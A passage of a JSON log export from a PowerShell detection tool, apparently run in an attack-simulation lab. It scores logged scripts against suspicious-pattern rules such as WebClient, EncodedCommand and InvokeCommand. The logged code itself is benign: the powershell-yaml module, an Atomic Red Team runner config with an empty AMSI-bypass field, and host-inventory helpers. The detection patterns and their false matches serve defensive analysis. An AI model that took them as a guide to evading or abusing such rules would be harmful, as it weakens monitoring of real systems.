if($Yaml -is [string]) {\n            $d += $Yaml + \"`n\"\n        }\n    }\n\n    END {\n        if($d -eq \"\"){\n            return\n        }\n        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser\n        if (!$documents.Count) {\n            return\n        }\n        if($documents.Count -eq 1){\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        if(!$AllDocuments) {\n            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered\n        }\n        $ret = @()\n        foreach($i in $documents) {\n            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered\n        }\n        return $ret\n    }\n}\n\n$stringQuotingEmitterSource = @\"\nusing System;\nusing System.Text.RegularExpressions;\nusing YamlDotNet;\nusing YamlDotNet.Core;\nusing YamlDotNet.Serialization;\nusing YamlDotNet.Serialization.EventEmitters;\npublic class StringQuotingEmitter: ChainedEventEmitter {\n    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356\n    private static Regex quotedRegex = new Regex(@`\"^(\\~|null|true|false|on|off|yes|no|y|n|[-+]?(\\.[0-9]+|[0-9]+(\\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\\.inf))?$`\", RegexOptions.Compiled | RegexOptions.IgnoreCase);\n    public StringQuotingEmitter(IEventEmitter next): base(next) {}\n\n    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {\n        var typeCode = eventInfo.Source.Value != null\n        ? Type.GetTypeCode(eventInfo.Source.Type)\n        : TypeCode.Empty;\n\n        switch (typeCode) {\n            case TypeCode.Char:\n                if (Char.IsDigit((char)eventInfo.Source.Value)) {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                }\n                break;\n            case TypeCode.String:\n                var val = eventInfo.Source.Value.ToString();\n                if (quotedRegex.IsMatch(val))\n                {\n                    eventInfo.Style = ScalarStyle.DoubleQuoted;\n                } else if (val.IndexOf('\\n') > -1) {\n                    eventInfo.Style = ScalarStyle.Literal;\n                }\n                break;\n        }\n\n        base.Emit(eventInfo, emitter);\n    }\n\n    public static SerializerBuilder Add(SerializerBuilder builder) {\n        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));\n    }\n}\n\"@\n\nif (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {\n    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)\n    if ($PSVersionTable.PSEdition -eq \"Core\") {\n        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions \"-nowarn:1701\"\n    } else {\n        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp\n    }\n}\n\nfunction Get-Serializer {\n    Param(\n        [Parameter(Mandatory=$true)][SerializationOptions]$Options\n    )\n    \n    $builder = New-Object \"YamlDotNet.Serialization.SerializerBuilder\"\n    \n    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {\n        $builder = $builder.EnsureRoundtrip()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {\n        $builder = $builder.DisableAliases()\n    }\n    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {\n        $builder = $builder.EmitDefaults()\n    }\n    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {\n        $builder = $builder.JsonCompatible()\n    }\n    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {\n        $builder = $builder.WithTypeResolver((New-Object \"YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver\"))\n    }\n    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {\n        $builder = $builder.WithIndentedSequences()\n    }\n    $builder = [StringQuotingEmitter]::Add($builder)\n    return $builder.Build()\n}\n\nfunction ConvertTo-Yaml {\n    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]\n    Param(\n        [Parameter(ValueFromPipeline = $true, Position=0)]\n        [System.Object]$Data,\n\n        [string]$OutFile,\n\n        [Parameter(ParameterSetName = 'Options')]\n        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,\n\n        [Parameter(ParameterSetName = 'NoOptions')]\n        [switch]$JsonCompatible,\n        \n        [switch]$KeepArray,\n\n        [switch]$Force\n    )\n    BEGIN {\n        $d = [System.Collections.Generic.List[object]](New-Object \"System.Collections.Generic.List[object]\")\n    }\n    PROCESS {\n        if($data -is [System.Object]) {\n            $d.Add($data)\n        }\n    }\n    END {\n        if ($d -eq $null -or $d.Count -eq 0) {\n            return\n        }\n        if ($d.Count -eq 1 -and !($KeepArray)) {\n            $d = $d[0]\n        }\n        $norm = Convert-PSObjectToGenericObject $d\n        if ($OutFile) {\n            $parent = Split-Path $OutFile\n            if (!(Test-Path $parent)) {\n                Throw \"Parent folder for specified path does not exist\"\n            }\n            if ((Test-Path $OutFile) -and !$Force) {\n                Throw \"Target file already exists. Use -Force to overwrite.\"\n            }\n            $wrt = New-Object \"System.IO.StreamWriter\" $OutFile\n        } else {\n            $wrt = New-Object \"System.IO.StringWriter\"\n        }\n    \n        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {\n            $Options = 0\n            if ($JsonCompatible) {\n                # No indent options :~(\n                $Options = [SerializationOptions]::JsonCompatible\n            }\n        }\n\n        try {\n            $serializer = Get-Serializer $Options\n            $serializer.Serialize($wrt, $norm)\n        }\n        catch{\n            $_\n        }\n        finally {\n            $wrt.Close()\n        }\n        if ($OutFile) {\n            return\n        } else {\n            return $wrt.ToString()\n        }\n    }\n}\n\nNew-Alias -Name cfy -Value ConvertFrom-Yaml\nNew-Alias -Name cty -Value ConvertTo-Yaml\n\nExport-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'\nPattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.2814347+00:00",
      "event_id": 35710518,
      "risk_score": 6,
      "detected_patterns": ", WebClient, Get",
      "pattern_details": "WebClient [Score: 5]; Get [Score: 1]",
      "command_length": 5396,
      "full_command": "\n$artConfig = [PSCustomObject]@{\n\n  # [optional] These two configs are calculated programatically, you probably don't need to change them\n  basehostname               = $((hostname | Select-String -Pattern \"(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$\").Matches.Groups[1].value)\n  OS                         = $( if ($IsLinux) { \"linux\" } elseif ($IsMacOS) { \"macos\" } else { \"windows\" })\n\n  # [optional(if using default install paths)] Paths to your Atomic Red Team \"atomics\" folder and your \"invoke-atomicredteam\" folder\n  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"/AtomicRedTeam/invoke-atomicredteam\" # this is the default install path so you probably don't need to change this\n  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })  \"AtomicRedTeam/atomics\" # this is the default install path so you probably don't need to change this\n  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { \"~\" } else { \"C:\" })   \"PrivateAtomics/atomics\" # if you aren't providing your own private atomics that are custom written by you, just leave this as is\n\n  # [ Optional ] The user that will be running each atomic test\n  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { \"$env:USERDOMAIN\\$env:USERNAME\" }) # example \"corp\\atomicrunner\"\n\n  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory\n  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example \"C:\\Users\\atomicrunner\"\n\n  # [optional]\n  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete\n  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner\n  scheduleFileName           = \"AtomicRunnerSchedule.csv\"\n\n  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger\n  LoggingModule              = ''\n\n  # [optional] Syslog configuration, default execution logs will be sent to this server:port\n  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\\\)\n  syslogPort                 = 514\n  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS\n\n  verbose                    = $true; # set to true for more log output\n\n  # [optional] logfile filename configs\n  logFolder                  = \"AtomicRunner-Logs\"\n  timeLocal                  = (Get-Date(get-date) -uformat \"%Y-%m-%d\").ToString()\n  logFileName                = \"$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv\"\n\n  # amsi bypass script block (applies to Windows only)\n  absb                       = $null\n\n  # AtomicRunnerService install directory\n  ServiceInstallDir                 = \"${ENV:windir}\\System32\"\n\n}\n\n# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values\n$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent\n$pathToPrivateConfig = Join-Path $root \"privateConfig.ps1\"\nif (Test-Path ($pathToPrivateConfig)) {\n  if ($IsLinux -or $IsMacOS) {\n    chmod +x $pathToPrivateConfig\n  }\n  & ($pathToPrivateConfig)\n}\n\n#####################################################################################\n# All of the configs below are calculated using the script block in the \"Value\" field.\n# This way, when you change the 'basePath' everything else is updated.\n# You should probably leave all of the stuff below alone.\n#####################################################################################\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"runnerFolder\"\n  Value       = { Join-Path $artConfig.basePath \"AtomicRunner\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"atomicLogsPath\"\n  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"scheduleFile\"\n  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"credFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"psc_$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"execLogPath\"\n  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"stopFile\"\n  Value       = { Join-Path $artConfig.runnerFolder \"stop.txt\" }\n}\nAdd-Member @scriptParam\n\n$scriptParam = @{\n  MemberType  = \"ScriptProperty\"\n  InputObject = $artConfig\n  Name        = \"logFile\"\n  Value       = { Join-Path $artConfig.atomicLogsPath \"log-$($artConfig.basehostname).txt\" }\n}\nAdd-Member @scriptParam\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'\nPattern 'Get' matched: 'get-'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.3990116+00:00",
      "event_id": 35710543,
      "risk_score": 6,
      "detected_patterns": ", EncodedCommand, SuspiciousCmdlet, Get",
      "pattern_details": "EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]",
      "command_length": 431,
      "full_command": "function Get-PreferredIPAddress($isWindows) {\n    if ($isWindows) {\n        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne \"WellKnown\" }).IPAddress\n    }\n    elseif ($IsMacOS) {\n        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr\n    }\n    elseif ($IsLinux) {\n        return ip -4 -br addr show | sed -n -e 's/^.*UP\\s* //p' | cut -d \"/\" -f 1\n    }\n    else {\n        return ''\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e ''\nPattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
    },
    {
      "timestamp": "2024-12-16T20:34:53.9179804+00:00",
      "event_id": 35710487,
      "risk_score": 5,
      "detected_patterns": ", WebClient",
      "pattern_details": "WebClient [Score: 5]",
      "command_length": 1762,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n# Module manifest for module 'powershell-yaml'\n#\n# Generated by: Gabriel Adrian Samfira\n#\n# Generated on: 10/01/2016\n#\n\n@{\n\n# Script module or binary module file associated with this manifest.\nRootModule = 'powershell-yaml.psm1'\n\n# Version number of this module.\nModuleVersion = '0.4.7'\n\n# ID used to uniquely identify this module\nGUID = '6a75a662-7f53-425a-9777-ee61284407da'\n\n# Author of this module\nAuthor = 'Gabriel Adrian Samfira','Alessandro Pilotti'\n\n# Company or vendor of this module\nCompanyName = 'Cloudbase Solutions SRL'\n\n# Copyright statement for this module\nCopyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'\n\n# Description of the functionality provided by this module\nDescription = 'Powershell module for serializing and deserializing YAML'\n\n# Minimum version of the Windows PowerShell engine required by this module\nPowerShellVersion = '3.0'\n\n# Script files (.ps1) that are run in the caller's environment prior to importing this module.\nScriptsToProcess = @(\"Load-Assemblies.ps1\")\n\n# Functions to export from this module\nFunctionsToExport = \"ConvertTo-Yaml\",\"ConvertFrom-Yaml\"\n\nAliasesToExport = \"cfy\",\"cty\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.2635861+00:00",
      "event_id": 35711100,
      "risk_score": 5,
      "detected_patterns": ", Get, InvokeCommand",
      "pattern_details": "Get [Score: 1]; InvokeCommand [Score: 4]",
      "command_length": 1770,
      "full_command": "function Get-TargetInfo($Session) {\n    $tmpDir = \"$env:TEMP\\\"\n    $isElevated = $false\n    $targetHostname = hostname\n    $targetUser = whoami\n    if ($Session) {\n        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {\n            $targetPlatform = \"windows\"\n            $tmpDir = \"/tmp/\"\n            $targetHostname = hostname\n            $targetUser = whoami\n            if ($IsLinux) { $targetPlatform = \"linux\" }\n            elseif ($IsMacOS) { $targetPlatform = \"macos\" }\n            else {\n                # windows\n                $tmpDir = \"$env:TEMP\\\"\n                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n            }\n            if ($IsLinux -or $IsMacOS) {\n                $isElevated = $false\n                $privid = id -u\n                if ($privid -eq 0) { $isElevated = $true }\n            }\n            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n        } # end ScriptBlock for remote session\n    }\n    else {\n        $targetPlatform = \"linux\"\n        if ($IsLinux -or $IsMacOS) {\n            $tmpDir = \"/tmp/\"\n            $isElevated = $false\n            $privid = id -u\n            if ($privid -eq 0) { $isElevated = $true }\n            if ($IsMacOS) { $targetPlatform = \"macos\" }\n        }\n        else {\n            $targetPlatform = \"windows\"\n            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n        }\n\n    }\n    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.7143546+00:00",
      "event_id": 35710626,
      "risk_score": 5,
      "detected_patterns": ", WebClient",
      "pattern_details": "WebClient [Score: 5]",
      "command_length": 1762,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n# Module manifest for module 'powershell-yaml'\n#\n# Generated by: Gabriel Adrian Samfira\n#\n# Generated on: 10/01/2016\n#\n\n@{\n\n# Script module or binary module file associated with this manifest.\nRootModule = 'powershell-yaml.psm1'\n\n# Version number of this module.\nModuleVersion = '0.4.7'\n\n# ID used to uniquely identify this module\nGUID = '6a75a662-7f53-425a-9777-ee61284407da'\n\n# Author of this module\nAuthor = 'Gabriel Adrian Samfira','Alessandro Pilotti'\n\n# Company or vendor of this module\nCompanyName = 'Cloudbase Solutions SRL'\n\n# Copyright statement for this module\nCopyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'\n\n# Description of the functionality provided by this module\nDescription = 'Powershell module for serializing and deserializing YAML'\n\n# Minimum version of the Windows PowerShell engine required by this module\nPowerShellVersion = '3.0'\n\n# Script files (.ps1) that are run in the caller's environment prior to importing this module.\nScriptsToProcess = @(\"Load-Assemblies.ps1\")\n\n# Functions to export from this module\nFunctionsToExport = \"ConvertTo-Yaml\",\"ConvertFrom-Yaml\"\n\nAliasesToExport = \"cfy\",\"cty\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.7480091+00:00",
      "event_id": 35711004,
      "risk_score": 5,
      "detected_patterns": ", WebClient",
      "pattern_details": "WebClient [Score: 5]",
      "command_length": 1762,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n# Module manifest for module 'powershell-yaml'\n#\n# Generated by: Gabriel Adrian Samfira\n#\n# Generated on: 10/01/2016\n#\n\n@{\n\n# Script module or binary module file associated with this manifest.\nRootModule = 'powershell-yaml.psm1'\n\n# Version number of this module.\nModuleVersion = '0.4.7'\n\n# ID used to uniquely identify this module\nGUID = '6a75a662-7f53-425a-9777-ee61284407da'\n\n# Author of this module\nAuthor = 'Gabriel Adrian Samfira','Alessandro Pilotti'\n\n# Company or vendor of this module\nCompanyName = 'Cloudbase Solutions SRL'\n\n# Copyright statement for this module\nCopyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'\n\n# Description of the functionality provided by this module\nDescription = 'Powershell module for serializing and deserializing YAML'\n\n# Minimum version of the Windows PowerShell engine required by this module\nPowerShellVersion = '3.0'\n\n# Script files (.ps1) that are run in the caller's environment prior to importing this module.\nScriptsToProcess = @(\"Load-Assemblies.ps1\")\n\n# Functions to export from this module\nFunctionsToExport = \"ConvertTo-Yaml\",\"ConvertFrom-Yaml\"\n\nAliasesToExport = \"cfy\",\"cty\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2577227+00:00",
      "event_id": 35710721,
      "risk_score": 5,
      "detected_patterns": ", Get, InvokeCommand",
      "pattern_details": "Get [Score: 1]; InvokeCommand [Score: 4]",
      "command_length": 1770,
      "full_command": "function Get-TargetInfo($Session) {\n    $tmpDir = \"$env:TEMP\\\"\n    $isElevated = $false\n    $targetHostname = hostname\n    $targetUser = whoami\n    if ($Session) {\n        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {\n            $targetPlatform = \"windows\"\n            $tmpDir = \"/tmp/\"\n            $targetHostname = hostname\n            $targetUser = whoami\n            if ($IsLinux) { $targetPlatform = \"linux\" }\n            elseif ($IsMacOS) { $targetPlatform = \"macos\" }\n            else {\n                # windows\n                $tmpDir = \"$env:TEMP\\\"\n                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n            }\n            if ($IsLinux -or $IsMacOS) {\n                $isElevated = $false\n                $privid = id -u\n                if ($privid -eq 0) { $isElevated = $true }\n            }\n            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n        } # end ScriptBlock for remote session\n    }\n    else {\n        $targetPlatform = \"linux\"\n        if ($IsLinux -or $IsMacOS) {\n            $tmpDir = \"/tmp/\"\n            $isElevated = $false\n            $privid = id -u\n            if ($privid -eq 0) { $isElevated = $true }\n            if ($IsMacOS) { $targetPlatform = \"macos\" }\n        }\n        else {\n            $targetPlatform = \"windows\"\n            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n        }\n\n    }\n    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.6082789+00:00",
      "event_id": 35710817,
      "risk_score": 5,
      "detected_patterns": ", WebClient",
      "pattern_details": "WebClient [Score: 5]",
      "command_length": 1762,
      "full_command": "# Copyright 2016 Cloudbase Solutions Srl\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n# Module manifest for module 'powershell-yaml'\n#\n# Generated by: Gabriel Adrian Samfira\n#\n# Generated on: 10/01/2016\n#\n\n@{\n\n# Script module or binary module file associated with this manifest.\nRootModule = 'powershell-yaml.psm1'\n\n# Version number of this module.\nModuleVersion = '0.4.7'\n\n# ID used to uniquely identify this module\nGUID = '6a75a662-7f53-425a-9777-ee61284407da'\n\n# Author of this module\nAuthor = 'Gabriel Adrian Samfira','Alessandro Pilotti'\n\n# Company or vendor of this module\nCompanyName = 'Cloudbase Solutions SRL'\n\n# Copyright statement for this module\nCopyright = '(c) 2016 Cloudbase Solutions SRL. All rights reserved.'\n\n# Description of the functionality provided by this module\nDescription = 'Powershell module for serializing and deserializing YAML'\n\n# Minimum version of the Windows PowerShell engine required by this module\nPowerShellVersion = '3.0'\n\n# Script files (.ps1) that are run in the caller's environment prior to importing this module.\nScriptsToProcess = @(\"Load-Assemblies.ps1\")\n\n# Functions to export from this module\nFunctionsToExport = \"ConvertTo-Yaml\",\"ConvertFrom-Yaml\"\n\nAliasesToExport = \"cfy\",\"cty\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'WebClient' matched: 'http'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.1314029+00:00",
      "event_id": 35710912,
      "risk_score": 5,
      "detected_patterns": ", Get, InvokeCommand",
      "pattern_details": "Get [Score: 1]; InvokeCommand [Score: 4]",
      "command_length": 1770,
      "full_command": "function Get-TargetInfo($Session) {\n    $tmpDir = \"$env:TEMP\\\"\n    $isElevated = $false\n    $targetHostname = hostname\n    $targetUser = whoami\n    if ($Session) {\n        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {\n            $targetPlatform = \"windows\"\n            $tmpDir = \"/tmp/\"\n            $targetHostname = hostname\n            $targetUser = whoami\n            if ($IsLinux) { $targetPlatform = \"linux\" }\n            elseif ($IsMacOS) { $targetPlatform = \"macos\" }\n            else {\n                # windows\n                $tmpDir = \"$env:TEMP\\\"\n                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n            }\n            if ($IsLinux -or $IsMacOS) {\n                $isElevated = $false\n                $privid = id -u\n                if ($privid -eq 0) { $isElevated = $true }\n            }\n            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n        } # end ScriptBlock for remote session\n    }\n    else {\n        $targetPlatform = \"linux\"\n        if ($IsLinux -or $IsMacOS) {\n            $tmpDir = \"/tmp/\"\n            $isElevated = $false\n            $privid = id -u\n            if ($privid -eq 0) { $isElevated = $true }\n            if ($IsMacOS) { $targetPlatform = \"macos\" }\n        }\n        else {\n            $targetPlatform = \"windows\"\n            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n        }\n\n    }\n    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4594222+00:00",
      "event_id": 35710582,
      "risk_score": 5,
      "detected_patterns": ", Get, InvokeCommand",
      "pattern_details": "Get [Score: 1]; InvokeCommand [Score: 4]",
      "command_length": 1770,
      "full_command": "function Get-TargetInfo($Session) {\n    $tmpDir = \"$env:TEMP\\\"\n    $isElevated = $false\n    $targetHostname = hostname\n    $targetUser = whoami\n    if ($Session) {\n        $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser = invoke-command -Session $Session -ScriptBlock {\n            $targetPlatform = \"windows\"\n            $tmpDir = \"/tmp/\"\n            $targetHostname = hostname\n            $targetUser = whoami\n            if ($IsLinux) { $targetPlatform = \"linux\" }\n            elseif ($IsMacOS) { $targetPlatform = \"macos\" }\n            else {\n                # windows\n                $tmpDir = \"$env:TEMP\\\"\n                $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n            }\n            if ($IsLinux -or $IsMacOS) {\n                $isElevated = $false\n                $privid = id -u\n                if ($privid -eq 0) { $isElevated = $true }\n            }\n            $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n        } # end ScriptBlock for remote session\n    }\n    else {\n        $targetPlatform = \"linux\"\n        if ($IsLinux -or $IsMacOS) {\n            $tmpDir = \"/tmp/\"\n            $isElevated = $false\n            $privid = id -u\n            if ($privid -eq 0) { $isElevated = $true }\n            if ($IsMacOS) { $targetPlatform = \"macos\" }\n        }\n        else {\n            $targetPlatform = \"windows\"\n            $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n        }\n\n    }\n    $targetPlatform, $isElevated, $tmpDir, $targetHostname, $targetUser\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:56.1194413+00:00",
      "event_id": 35710903,
      "risk_score": 4,
      "detected_patterns": ", EncodedCommand",
      "pattern_details": "EncodedCommand [Score: 4]",
      "command_length": 19452,
